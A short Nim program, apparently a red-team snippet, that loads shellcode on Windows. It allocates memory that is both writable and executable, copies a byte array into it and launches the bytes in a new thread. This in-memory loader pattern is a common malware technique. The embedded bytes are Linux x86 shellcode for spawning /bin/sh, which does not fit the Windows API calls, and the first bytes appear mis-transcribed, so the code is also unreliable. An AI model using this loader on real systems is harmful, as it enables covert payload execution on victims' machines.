import winim/lean

# Define the shellcode as a byte array
#Use shellcode to byte array using shellcode-2-byte.nim
let shellcode = [31, 0, 80, 104, 47, 47, 115, 104, 104, 47, 98, 105, 110, 137, 227, 80, 137, 226, 83, 137, 225, 176, 11, 205, 128]

# Allocate memory for the shellcode
let memory = VirtualAlloc(0, len(shellcode), 0x3000, 0x40)

# Copy the shellcode into the allocated memory
RtlMoveMemory(memory, @shellcode[0], len(shellcode))

# Create a thread to execute the shellcode
let shellcode_thread = CreateThread(0, 0, memory, 0, 0, addr 0)

# Wait for the thread to finish
WaitForSingleObject(shellcode_thread, -1)
